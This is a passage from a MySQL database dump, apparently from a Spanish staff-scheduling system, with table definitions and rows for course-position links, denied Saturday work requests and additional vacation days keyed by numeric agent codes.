INSERT INTO `cursos_cargos` VALUES (80,4,4),(79,4,5),(81,4,8),(256,5,1),(261,5,2),(258,5,4),(257,5,5),(260,5,6),(259,5,8),(262,6,1),(267,6,2),(264,6,4),(263,6,5),(266,6,6),(265,6,8),(95,7,1),(100,7,2),(97,7,4),(96,7,5),(99,7,6),(98,7,8),(103,9,1),(108,9,2),(105,9,4),(104,9,5),(107,9,6),(106,9,8),(63,10,1),(66,10,2),(65,10,6),(64,10,8),(67,11,1),(72,11,2),(69,11,4),(68,11,5),(71,11,6),(70,11,8),(83,12,4),(82,12,5),(84,12,8),(238,13,2),(236,13,4),(237,13,8),(73,14,1),(78,14,2),(75,14,4),(74,14,5),(77,14,6),(76,14,8),(156,15,1),(161,15,2),(158,15,4),(157,15,5),(160,15,6),(159,15,8),(115,16,1),(120,16,2),(117,16,4),(116,16,5),(119,16,6),(118,16,8),(109,17,1),(114,17,2),(111,17,4),(110,17,5),(113,17,6),(112,17,8),(121,18,1),(126,18,2),(123,18,4),(122,18,5),(125,18,6),(124,18,8),(127,19,1),(132,19,2),(129,19,4),(128,19,5),(131,19,6),(130,19,8),(135,20,4),(134,20,5),(200,21,1),(202,21,2),(201,21,6),(162,26,1),(167,26,2),(164,26,4),(163,26,5),(166,26,6),(165,26,8),(169,27,4),(168,27,5),(170,27,8),(178,28,4),(177,28,5),(179,28,8),(183,30,1),(186,30,2),(185,30,6),(184,30,8),(235,32,2),(233,32,4),(234,32,8),(275,33,4),(274,33,5),(276,33,8),(198,34,4),(197,34,5),(199,34,8),(303,36,2),(300,36,4),(299,36,5),(302,36,6),(301,36,8),(208,37,1),(213,37,2),(210,37,4),(209,37,5),(212,37,6),(211,37,8),(214,38,1),(219,38,2),(216,38,4),(215,38,5),(218,38,6),(217,38,8),(220,39,1),(225,39,2),(222,39,4),(221,39,5),(224,39,6),(223,39,8),(241,40,2),(239,40,4),(240,40,8),(230,41,2),(229,41,6),(228,41,8),(242,42,2),(243,43,2),(244,44,2),(245,45,2),(268,46,4),(269,46,8),(270,47,5),(272,48,2),(271,48,8),(312,49,4),(311,49,5),(313,49,8),(279,50,2),(277,50,5),(278,50,8),(280,51,1),(285,51,2),(282,51,4),(281,51,5),(284,51,6),(283,51,8),(286,52,5),(287,53,5),(288,54,1),(293,54,2),(290,54,4),(289,54,5),(292,54,6),(291,54,8),(298,56,2),(297,56,6),(296,56,8),(304,57,5),(323,58,4),(322,58,5),(325,58,8),(324,58,9),(310,59,5),(309,60,5),(321,61,2),(319,61,5),(320,61,8);
/*!40000 ALTER TABLE `cursos_cargos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `denegacion_sabados`
--

DROP TABLE IF EXISTS `denegacion_sabados`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `denegacion_sabados` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `sabado_trabajado_id` int(11) NOT NULL,
  `fecha_solicitada` date NOT NULL,
  `motivo_denegacion` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `sabado_trabajado_id` (`sabado_trabajado_id`),
  CONSTRAINT `denegacion_sabados_ibfk_1` FOREIGN KEY (`sabado_trabajado_id`) REFERENCES `sabados_trabajados` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `denegacion_sabados`
--

LOCK TABLES `denegacion_sabados` WRITE;
/*!40000 ALTER TABLE `denegacion_sabados` DISABLE KEYS */;
INSERT INTO `denegacion_sabados` VALUES (1,237,'2023-01-21','En principio no es necesario tienes descanso'),(2,206,'2023-01-20','En principio no es necesario tienes descanso'),(3,404,'2024-09-14','TE PONGO DESCANSO, CONSERVAS EL DIA'),(4,477,'2026-04-18','Por tener descanso'),(5,493,'2026-04-19','Por tener descanso');
/*!40000 ALTER TABLE `denegacion_sabados` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dia_adicional_vacaciones`
--

DROP TABLE IF EXISTS `dia_adicional_vacaciones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dia_adicional_vacaciones` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `codigo_agente` int(11) NOT NULL,
  `year` int(11) NOT NULL,
  `fecha_disfrute` date DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT 0,
  `created` datetime NOT NULL,
  `modified` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `codigo_agente` (`codigo_agente`),
  CONSTRAINT `dia_adicional_vacaciones_ibfk_1` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=611 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dia_adicional_vacaciones`
--

LOCK TABLES `dia_adicional_vacaciones` WRITE;
/*!40000 ALTER TABLE `dia_adicional_vacaciones` DISABLE KEYS */;
INSERT INTO `dia_adicional_vacaciones` VALUES (1,159,2016,'2016-08-17',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(2,180,2016,'2016-08-31',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(3,190,2016,'2016-10-07',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(4,207,2016,'2016-12-30',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(5,239,2016,'2016-12-20',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(6,241,2016,'2016-12-27',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(7,291,2016,'2016-07-11',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(8,200,2016,'2016-12-30',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(9,88,2016,'2017-12-31',1,'2018-01-08 00:00:00','2018-01-08 12:05:32'),(10,102,2016,'2016-12-01',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(11,192,2016,'2016-11-28',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(12,193,2016,'2016-12-16',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(13,78,2016,'2016-05-17',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(14,150,2016,'2016-12-21',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(15,129,2016,'2016-08-22',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(16,171,2016,'2016-12-28',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(17,155,2016,'2016-12-27',1,'2018-01-08 00:00:00','2018-01-08 00:00:00'),(19,1000,2018,'2018-10-05',2,'2018-08-22 17:32:40','2018-09-19 12:31:21'),(20,63,2019,'2019-07-19',2,'2019-05-08 08:30:22','2019-07-08 05:41:07'),(22,81,2019,'2019-12-02',2,'2019-05-08 08:30:22','2019-11-21 06:00:55'),(23,88,2019,'2019-08-15',2,'2019-05-08 08:30:22','2019-08-12 17:36:00'),(24,102,2019,'2019-08-29',2,'2019-05-08 08:30:22','2019-08-21 04:46:30'),(25,129,2019,'2019-10-26',2,'2019-05-08 08:30:22','2019-10-25 18:21:02'),(26,133,2019,'2019-07-20',2,'2019-05-08 08:30:22','2019-07-10 12:55:23'),(27,136,2019,'2019-12-12',2,'2019-05-08 08:30:22','2019-11-20 14:12:37'),(28,140,2019,'2019-12-16',2,'2019-05-08 08:30:22','2019-11-21 05:55:10'),(29,150,2019,'2019-12-26',2,'2019-05-08 08:30:22','2019-11-15 06:09:11'),(30,155,2019,NULL,0,'2019-05-08 08:30:22','2019-05-08 08:30:22'),(32,159,2019,'2019-10-11',2,'2019-05-08 08:30:22','2019-10-01 05:29:36'),(33,167,2019,'2019-08-15',2,'2019-05-08 08:30:22','2019-07-29 09:38:27'),(34,171,2019,NULL,0,'2019-05-08 08:30:22','2019-05-08 08:30:22'),(35,178,2019,'2019-11-03',2,'2019-05-08 08:30:22','2019-09-26 12:39:42'),(36,180,2019,'2019-06-19',2,'2019-05-08 08:30:22','2019-05-15 12:34:22'),(37,181,2019,'2019-10-19',2,'2019-05-08 08:30:22','2019-10-03 12:33:15'),(38,190,2019,'2020-03-08',2,'2019-05-08 08:30:22','2020-02-04 06:29:57'),(39,191,2019,'2019-09-21',2,'2019-05-08 08:30:22','2019-09-02 08:50:22'),(40,192,2019,'2019-12-19',2,'2019-05-08 08:30:22','2019-10-26 05:30:01'),(41,193,2019,'2019-12-18',2,'2019-05-08 08:30:22','2019-12-09 10:39:22'),(42,196,2019,'2019-10-02',2,'2019-05-08 08:30:22','2019-09-27 05:04:07'),(43,198,2019,'2019-12-31',2,'2019-05-08 08:30:22','2019-05-15 12:34:33'),(44,200,2019,'2020-01-06',2,'2019-05-08 08:30:22','2019-11-26 07:23:42'),(45,201,2019,NULL,0,'2019-05-08 08:30:22','2019-05-08 08:30:22'),(46,202,2019,'2019-10-13',2,'2019-05-08 08:30:22','2019-07-29 13:49:06'),(47,207,2019,'2019-11-26',2,'2019-05-08 08:30:22','2019-07-18 04:51:37'),(48,217,2019,'2019-12-24',2,'2019-05-08 08:30:22','2019-10-14 07:25:17'),(49,218,2019,'2019-09-09',2,'2019-05-08 08:30:22','2019-08-19 13:58:01'),(50,225,2019,'2019-07-31',2,'2019-05-08 08:30:22','2019-07-24 13:42:08'),(51,228,2019,NULL,0,'2019-05-08 08:30:22','2019-05-08 08:30:22'),(52,229,2019,'2019-12-26',2,'2019-05-08 08:30:22','2019-11-14 16:05:46'),(53,234,2019,'2019-10-03',2,'2019-05-08 08:30:22','2019-09-17 06:17:03'),(54,239,2019,'2019-08-08',2,'2019-05-08 08:30:22','2019-05-08 08:31:06'),(55,241,2019,'2019-11-25',2,'2019-05-08 08:30:22','2019-10-02 04:16:00'),(56,244,2019,'2019-07-04',2,'2019-05-08 08:30:22','2019-06-27 05:18:01'),(57,245,2019,'2019-11-28',2,'2019-05-08 08:30:22','2019-11-02 09:03:19'),(59,277,2019,'2019-09-03',2,'2019-05-08 08:30:22','2019-07-29 12:24:48'),(60,287,2019,'2019-09-29',2,'2019-05-08 08:30:22','2019-09-16 13:19:13'),(61,292,2019,'2019-08-05',2,'2019-05-08 08:30:22','2019-06-24 10:26:40'),(62,306,2019,'2019-09-04',2,'2019-05-08 08:30:22','2019-08-07 13:51:14'),(63,336,2019,'2019-12-26',2,'2019-05-08 08:30:22','2019-11-19 13:55:06'),(64,1000,2019,'2019-09-27',2,'2019-09-26 13:15:07','2019-09-26 13:16:01'),(65,81,2019,'2019-12-03',2,'2019-11-18 07:29:07','2019-11-21 06:01:00'),(66,81,2019,'2019-12-04',2,'2019-11-18 07:29:17','2019-11-21 06:01:04'),(67,88,2019,'2019-12-20',2,'2019-11-18 07:32:56','2019-12-18 06:52:12'),(68,88,2019,'2019-11-22',2,'2019-11-18 07:33:34','2019-11-21 06:16:09'),(69,102,2019,'2019-12-20',2,'2019-11-18 07:33:55','2019-12-12 06:50:11'),(70,102,2019,'2019-12-27',2,'2019-11-18 07:34:06','2019-12-12 06:50:21'),(71,129,2019,'2019-12-14',2,'2019-11-18 07:34:29','2019-12-05 15:30:29'),(72,129,2019,'2019-12-15',2,'2019-11-18 07:34:38','2019-12-05 15:30:36'),(73,140,2019,'2019-12-17',2,'2019-11-18 07:41:51','2019-11-21 05:55:15'),(74,140,2019,'2019-12-18',2,'2019-11-18 07:42:02','2019-11-21 05:55:06'),(75,150,2019,'2020-09-14',2,'2019-11-18 07:42:26','2020-09-07 08:02:06'),(76,150,2019,'2020-09-15',2,'2019-11-18 07:42:34','2020-09-07 08:02:26'),(77,155,2019,NULL,0,'2019-11-18 07:42:56','2019-11-18 07:42:56'),(78,155,2019,NULL,0,'2019-11-18 07:43:05','2019-11-18 07:43:05'),(79,159,2019,'2020-12-30',2,'2019-11-18 07:43:27','2020-10-20 11:26:21'),(80,159,2019,'2021-01-05',2,'2019-11-18 07:43:36','2020-10-20 11:26:11'),(81,171,2019,NULL,0,'2019-11-18 07:43:56','2019-11-18 07:43:56'),(82,171,2019,NULL,0,'2019-11-18 07:44:10','2019-11-18 07:44:10'),(83,180,2019,'2019-12-16',2,'2019-11-18 07:44:28','2019-12-12 15:16:33'),(84,190,2019,'2020-03-08',1,'2019-11-18 07:45:08','2020-02-04 06:29:52'),(86,193,2019,'2019-12-19',2,'2019-11-18 07:45:45','2019-12-09 10:39:15'),(87,198,2019,'2020-01-06',2,'2019-11-18 07:47:37','2019-12-18 07:19:42'),(88,241,2019,'2019-11-26',2,'2019-11-18 07:55:08','2019-12-18 06:54:01'),(89,241,2019,'2019-11-27',2,'2019-11-18 07:55:22','2019-12-18 06:54:20'),(90,247,2019,'2020-01-13',2,'2019-11-18 07:56:00','2019-12-18 06:56:50'),(91,181,2019,'2019-10-20',2,'2019-11-19 13:58:28','2019-11-19 13:58:53'),(92,234,2019,'2019-12-10',2,'2019-11-19 13:59:21','2019-11-19 14:00:24'),(93,234,2019,'2019-12-09',2,'2019-11-19 13:59:43','2019-11-19 14:00:35'),(94,229,2019,NULL,0,'2019-11-19 14:01:03','2019-11-19 14:01:03'),(95,229,2019,'2019-12-27',2,'2019-11-19 14:01:18','2019-11-19 14:04:11'),(96,277,2019,'2019-12-18',2,'2019-11-19 14:04:43','2019-11-19 14:05:49'),(97,277,2019,'2019-11-29',2,'2019-11-19 14:04:56','2019-11-19 14:05:28'),(101,63,2019,'2019-12-12',2,'2019-11-19 14:11:38','2019-11-19 14:12:44'),(102,63,2019,'2019-12-13',2,'2019-11-19 14:11:53','2019-11-19 14:12:53'),(103,136,2019,NULL,0,'2019-11-19 14:13:30','2019-11-19 14:13:30'),(104,136,2019,'2019-12-11',2,'2019-11-19 14:14:03','2019-11-20 14:12:30'),(105,167,2019,'2019-12-21',2,'2019-11-19 14:15:46','2019-11-19 14:16:05'),(106,178,2019,'2020-01-24',2,'2019-11-19 14:17:29','2020-01-27 09:55:27'),(107,191,2019,NULL,0,'2019-11-19 14:18:16','2019-11-19 14:18:16'),(108,217,2019,NULL,0,'2019-11-19 14:19:00','2019-11-19 14:19:00'),(109,225,2019,'2020-01-01',2,'2019-11-19 14:19:45','2019-11-28 10:49:13'),(110,225,2019,'2019-12-25',2,'2019-11-19 14:20:02','2019-11-28 10:48:54'),(111,228,2019,'2020-01-06',2,'2019-11-19 14:21:26','2019-12-27 12:46:03'),(112,228,2019,NULL,0,'2019-11-19 14:21:42','2019-11-19 14:21:42'),(114,336,2019,NULL,0,'2019-11-19 14:23:20','2019-11-19 14:23:20'),(115,336,2019,NULL,0,'2019-11-19 14:23:37','2019-11-19 14:23:37'),(116,276,2019,'2020-09-07',2,'2019-12-04 17:33:42','2020-08-30 07:20:14'),(117,276,2019,'2020-09-08',2,'2019-12-04 17:34:00','2020-08-30 07:19:50'),(121,63,2020,'2020-12-24',2,'2020-06-04 15:41:45','2020-12-02 12:10:29'),(122,63,2020,'2020-07-19',2,'2020-06-04 15:41:45','2020-07-06 10:00:40'),(123,63,2020,'2020-09-02',2,'2020-06-04 15:41:45','2020-08-20 08:08:36'),(124,81,2020,'2020-08-17',2,'2020-06-04 15:41:45','2020-06-08 05:22:12'),(125,81,2020,'2020-08-18',2,'2020-06-04 15:41:45','2020-06-08 05:22:20'),(126,81,2020,'2020-08-19',2,'2020-06-04 15:41:45','2020-06-08 05:22:26'),(127,88,2020,'2020-09-30',2,'2020-06-04 15:41:45','2020-09-17 05:22:37'),(128,88,2020,'2020-10-01',2,'2020-06-04 15:41:45','2020-09-17 05:24:38'),(129,88,2020,'2020-07-04',2,'2020-06-04 15:41:45','2020-06-04 18:44:04'),(130,89,2020,'2020-08-10',2,'2020-06-04 15:41:45','2020-08-03 06:23:17'),(131,89,2020,'2020-12-12',2,'2020-06-04 15:41:45','2020-12-02 12:15:09'),(132,89,2020,'2020-12-15',2,'2020-06-04 15:41:45','2020-12-04 07:59:02'),(133,129,2020,NULL,0,'2020-06-04 15:41:45','2020-06-04 15:41:45'),(134,129,2020,NULL,0,'2020-06-04 15:41:45','2020-06-04 15:41:45'),(135,129,2020,NULL,0,'2020-06-04 15:41:45','2020-06-04 15:41:45'),(136,136,2020,'2020-11-17',2,'2020-06-04 15:41:45','2020-12-02 12:15:00'),(137,136,2020,'2020-08-28',2,'2020-06-04 15:41:45','2020-08-13 11:44:31'),(138,136,2020,'2020-12-21',2,'2020-06-04 15:41:45','2020-12-02 12:14:38'),(139,140,2020,'2020-10-19',2,'2020-06-04 15:41:45','2020-09-22 06:07:32'),(140,140,2020,'2020-10-20',2,'2020-06-04 15:41:45','2020-09-22 06:08:01'),(141,140,2020,'2020-12-31',2,'2020-06-04 15:41:45','2020-12-18 06:21:55'),(142,150,2020,'2020-07-14',2,'2020-06-04 15:41:45','2020-06-12 05:58:38'),(143,150,2020,'2020-07-09',2,'2020-06-04 15:41:45','2020-06-12 05:58:33'),(144,150,2020,'2020-07-10',2,'2020-06-04 15:41:45','2020-06-12 05:58:42'),(145,155,2020,'2020-10-27',2,'2020-06-04 15:41:45','2020-09-30 05:28:47'),(146,155,2020,'2020-10-26',2,'2020-06-04 15:41:45','2020-09-30 05:28:51'),(147,155,2020,'2020-10-28',2,'2020-06-04 15:41:45','2020-09-30 05:28:43'),(151,159,2020,'2020-10-30',2,'2020-06-04 15:41:45','2020-10-20 11:25:33'),(152,159,2020,'2020-10-31',2,'2020-06-04 15:41:45','2020-10-20 11:25:49'),(153,159,2020,'2020-12-10',2,'2020-06-04 15:41:45','2020-10-20 11:25:45'),(154,171,2020,'2020-12-21',2,'2020-06-04 15:41:45','2020-12-18 07:59:58'),(155,171,2020,'2020-12-22',2,'2020-06-04 15:41:45','2020-12-18 08:00:01'),(156,171,2020,'2020-12-23',2,'2020-06-04 15:41:45','2020-12-18 08:00:03'),(157,178,2020,NULL,0,'2020-06-04 15:41:45','2020-06-04 15:41:45'),(158,178,2020,'2020-10-25',2,'2020-06-04 15:41:45','2020-12-02 12:23:03'),(159,179,2020,NULL,0,'2020-06-04 15:41:45','2020-06-04 15:41:45'),(160,179,2020,NULL,0,'2020-06-04 15:41:45','2020-06-04 15:41:45'),(161,192,2020,'2020-11-26',2,'2020-06-04 15:41:45','2020-10-07 09:27:53'),(162,193,2020,'2020-11-25',2,'2020-06-04 15:41:45','2020-10-20 12:25:44'),(163,193,2020,'2020-11-26',2,'2020-06-04 15:41:45','2020-10-20 12:25:48'),(164,196,2020,'2020-07-07',2,'2020-06-04 15:41:45','2020-06-09 09:01:58'),(165,198,2020,NULL,0,'2020-06-04 15:41:45','2020-06-04 15:41:45'),(166,198,2020,NULL,0,'2020-06-04 15:41:45','2020-06-04 15:41:45'),(167,200,2020,'2021-01-06',2,'2020-06-04 15:41:45','2020-12-14 07:08:06'),(168,201,2020,'2020-08-21',2,'2020-06-04 15:41:45','2020-08-05 04:50:01'),(169,202,2020,'2020-10-09',2,'2020-06-04 15:41:45','2020-10-02 07:41:02'),(170,207,2020,'2020-12-19',2,'2020-06-04 15:41:45','2020-10-22 05:38:44'),(171,207,2020,'2020-12-20',2,'2020-06-04 15:41:45','2020-10-22 05:38:47'),(172,217,2020,'2020-10-10',2,'2020-06-04 15:41:45','2020-10-02 07:40:44'),(173,218,2020,'2020-07-20',2,'2020-06-04 15:41:45','2020-09-07 09:28:08'),(177,228,2020,'2020-09-23',2,'2020-06-04 15:41:45','2020-09-07 09:28:24'),(178,228,2020,'2020-09-24',2,'2020-06-04 15:41:45','2020-09-07 09:28:28'),(179,228,2020,'2020-09-18',2,'2020-06-04 15:41:45','2020-09-07 09:28:17'),(180,229,2020,'2020-10-27',2,'2020-06-04 15:41:45','2020-10-22 06:44:33'),(181,229,2020,'2020-10-28',2,'2020-06-04 15:41:45','2020-10-22 06:44:38'),(182,229,2020,'2020-10-26',2,'2020-06-04 15:41:45','2020-10-22 06:44:17'),(183,233,2020,'2020-12-28',2,'2020-06-04 15:41:45','2020-12-09 15:06:59'),(184,233,2020,'2020-08-08',2,'2020-06-04 15:41:45','2020-07-28 13:28:01'),(185,233,2020,'2020-08-09',2,'2020-06-04 15:41:45','2020-07-28 13:28:18'),(186,234,2020,'2020-07-29',2,'2020-06-04 15:41:45','2020-07-02 12:13:03'),(187,234,2020,'2020-07-27',2,'2020-06-04 15:41:45','2020-07-02 12:12:55'),(188,234,2020,'2020-07-28',2,'2020-06-04 15:41:45','2020-07-02 12:12:59'),(189,239,2020,'2020-12-28',2,'2020-06-04 15:41:45','2020-10-13 09:03:53'),(190,241,2020,'2021-01-07',2,'2020-06-04 15:41:45','2020-10-16 06:48:14'),(191,241,2020,'2020-12-26',2,'2020-06-04 15:41:45','2020-10-16 06:48:11'),(192,241,2020,'2020-12-27',2,'2020-06-04 15:41:45','2020-10-16 06:48:07'),(193,244,2020,'2020-07-18',2,'2020-06-04 15:41:45','2020-06-16 05:46:54'),(194,245,2020,'2020-11-25',2,'2020-06-04 15:41:45','2020-12-02 12:13:36'),(195,247,2020,'2020-11-02',2,'2020-06-04 15:41:45','2020-08-06 06:56:20'),(196,253,2020,'2020-08-24',2,'2020-06-04 15:41:45','2020-06-05 07:22:20'),(197,276,2020,'2020-08-27',2,'2020-06-04 15:41:45','2020-08-19 05:21:00'),(198,276,2020,'2020-08-28',2,'2020-06-04 15:41:45','2020-08-19 05:20:27'),(199,277,2020,'2020-09-04',2,'2020-06-04 15:41:45','2020-08-03 11:18:55'),(200,277,2020,'2020-09-05',2,'2020-06-04 15:41:45','2020-08-03 11:18:45'),(201,277,2020,'2020-09-06',2,'2020-06-04 15:41:45','2020-08-03 11:19:00'),(202,287,2020,NULL,0,'2020-06-04 15:41:45','2020-06-04 15:41:45'),(203,291,2020,'2020-07-27',2,'2020-06-04 15:41:45','2020-06-22 05:17:49'),(204,292,2020,'2020-12-13',2,'2020-06-04 15:41:45','2020-10-07 10:18:06'),(205,293,2020,'2020-11-16',2,'2020-06-04 15:41:45','2020-11-26 09:13:34'),(206,63,2021,'2021-04-13',2,'2021-03-10 09:27:35','2021-04-11 14:40:15'),(207,63,2021,'2021-04-14',2,'2021-03-10 09:27:35','2021-04-11 14:40:28'),(208,63,2021,'2021-04-15',2,'2021-03-10 09:27:35','2021-04-11 14:40:33'),(209,81,2021,'2021-08-17',2,'2021-03-10 09:27:35','2021-10-04 14:46:30'),(210,81,2021,'2021-08-18',2,'2021-03-10 09:27:35','2021-06-11 05:02:11'),(211,81,2021,'2021-08-19',2,'2021-03-10 09:27:35','2021-06-11 05:02:06'),(212,89,2021,'2021-12-10',2,'2021-03-10 09:27:35','2021-11-24 11:14:43'),(213,89,2021,'2021-12-11',2,'2021-03-10 09:27:35','2021-11-24 11:14:05'),(214,89,2021,'2021-12-18',2,'2021-03-10 09:27:35','2021-11-29 13:04:47'),(215,102,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(216,102,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(217,102,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(218,136,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(219,136,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(220,136,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(221,150,2021,'2021-12-13',2,'2021-03-10 09:27:35','2021-11-29 08:33:22'),(222,150,2021,'2021-12-24',2,'2021-03-10 09:27:35','2021-11-29 08:33:27'),(223,150,2021,'2021-09-10',2,'2021-03-10 09:27:35','2021-09-01 09:44:45'),(224,159,2021,'2021-10-06',2,'2021-03-10 09:27:35','2021-09-08 09:47:05'),(225,159,2021,'2021-10-07',2,'2021-03-10 09:27:35','2021-09-08 09:47:12'),(226,159,2021,'2021-11-19',2,'2021-03-10 09:27:35','2021-10-26 07:19:53'),(227,167,2021,'2021-08-19',2,'2021-03-10 09:27:35','2021-06-15 15:09:03'),(228,167,2021,'2021-08-20',2,'2021-03-10 09:27:35','2021-06-15 15:09:15'),(229,167,2021,'2021-08-18',2,'2021-03-10 09:27:35','2021-06-15 15:08:58'),(230,171,2021,'2021-12-10',2,'2021-03-10 09:27:35','2021-12-03 06:23:27'),(231,171,2021,'2021-12-17',2,'2021-03-10 09:27:35','2021-12-03 06:25:47'),(232,171,2021,'2021-12-16',2,'2021-03-10 09:27:35','2021-12-03 06:25:35'),(233,178,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(234,178,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(235,180,2021,'2021-12-17',2,'2021-03-10 09:27:35','2021-12-07 08:19:32'),(236,180,2021,'2021-12-21',2,'2021-03-10 09:27:35','2021-12-07 08:19:06'),(237,181,2021,'2021-10-13',2,'2021-03-10 09:27:35','2021-10-04 14:45:44'),(238,181,2021,'2021-10-12',2,'2021-03-10 09:27:35','2021-10-04 14:46:18'),(239,192,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(240,192,2021,'2021-09-16',2,'2021-03-10 09:27:35','2021-07-30 09:24:55'),(241,193,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(242,193,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(243,196,2021,'2021-07-10',2,'2021-03-10 09:27:35','2021-04-14 05:07:27'),(244,196,2021,'2021-07-11',2,'2021-03-10 09:27:35','2021-04-14 05:07:35'),(245,200,2021,'2021-11-01',2,'2021-03-10 09:27:35','2021-10-22 11:44:45'),(246,200,2021,'2022-01-05',2,'2021-03-10 09:27:35','2021-11-04 07:34:38'),(247,201,2021,'2021-07-22',2,'2021-03-10 09:27:35','2021-07-12 06:52:01'),(248,201,2021,'2021-07-23',2,'2021-03-10 09:27:35','2021-07-12 06:52:05'),(249,202,2021,'2021-10-02',2,'2021-03-10 09:27:35','2021-08-13 08:20:59'),(250,207,2021,'2021-08-24',2,'2021-03-10 09:27:35','2021-08-15 05:27:17'),(251,207,2021,'2021-11-11',2,'2021-03-10 09:27:35','2021-10-13 05:36:14'),(252,217,2021,'2021-11-28',2,'2021-03-10 09:27:35','2021-10-28 08:02:21'),(254,228,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(255,228,2021,'2021-08-09',2,'2021-03-10 09:27:35','2021-09-07 08:20:18'),(256,228,2021,'2021-08-13',2,'2021-03-10 09:27:35','2021-09-07 08:20:11'),(257,229,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(258,229,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(259,229,2021,NULL,0,'2021-03-10 09:27:35','2021-03-10 09:27:35'),(260,233,2021,'2021-08-15',2,'2021-03-10 09:27:35','2021-06-03 16:42:40'),(261,233,2021,'2021-08-13',2,'2021-03-10 09:27:35','2021-06-03 16:42:28'),(262,233,2021,'2021-08-14',2,'2021-03-10 09:27:35','2021-06-03 16:42:34'),(263,234,2021,'2021-08-29',2,'2021-03-10 09:27:35','2021-09-07 08:20:39'),(264,234,2021,'2021-08-27',2,'2021-03-10 09:27:35','2021-09-07 08:20:28'),(265,234,2021,'2021-08-28',2,'2021-03-10 09:27:35','2021-09-07 08:20:33'),(266,239,2021,'2021-06-30',2,'2021-03-10 09:27:35','2021-06-01 06:31:38'),(267,239,2021,'2021-11-27',2,'2021-03-10 09:27:35','2021-10-13 05:34:46'),(268,241,2021,'2021-09-15',2,'2021-03-10 09:27:35','2021-05-13 06:54:47'),(269,241,2021,'2021-09-16',2,'2021-03-10 09:27:35','2021-05-13 06:54:51'),(270,241,2021,'2021-09-14',2,'2021-03-10 09:27:35','2021-05-13 06:54:43'),(271,244,2021,'2021-09-13',2,'2021-03-10 09:27:35','2021-07-27 05:13:44'),(272,245,2021,'2021-09-24',2,'2021-03-10 09:27:35','2021-09-07 08:12:49'),(273,247,2021,'2021-07-08',2,'2021-03-10 09:27:35','2021-05-05 06:51:51'),(274,247,2021,'2021-07-07',2,'2021-03-10 09:27:35','2021-05-05 06:51:48'),(275,253,2021,'2021-08-21',2,'2021-03-10 09:27:35','2021-06-14 14:47:40'),(276,276,2021,'2021-08-07',2,'2021-03-10 09:27:35','2021-04-26 18:22:23'),(277,276,2021,'2021-08-08',2,'2021-03-10 09:27:35','2021-04-26 18:22:28'),(278,277,2021,'2021-07-08',2,'2021-03-10 09:27:35','2021-05-04 09:32:33'),(279,277,2021,'2021-07-09',2,'2021-03-10 09:27:35','2021-05-04 09:32:47'),(280,277,2021,'2021-07-07',2,'2021-03-10 09:27:35','2021-05-04 09:33:06'),(281,291,2021,'2021-10-26',2,'2021-03-10 09:27:35','2021-09-24 05:49:17'),(282,291,2021,'2021-10-27',2,'2021-03-10 09:27:35','2021-09-24 05:49:04'),(283,292,2021,'2021-08-23',2,'2021-03-10 09:27:35','2021-05-20 04:52:52'),(284,306,2021,'2021-06-03',2,'2021-03-10 09:27:35','2021-05-20 11:04:07'),(286,218,2021,'2021-06-15',2,'2021-06-14 17:02:19','2021-06-15 15:02:35'),(287,81,2022,'2022-10-01',2,'2022-03-10 10:56:14','2022-04-05 05:59:01'),(288,89,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 10:56:14'),(289,159,2022,'2022-09-08',2,'2022-03-10 10:56:14','2022-08-29 07:10:01'),(290,167,2022,'2022-05-20',2,'2022-03-10 10:56:14','2022-10-11 09:52:27'),(291,171,2022,'2022-08-19',2,'2022-03-10 10:56:14','2022-07-29 12:50:11'),(292,178,2022,NULL,0,'2022-03-10 10:56:14','2022-03-10 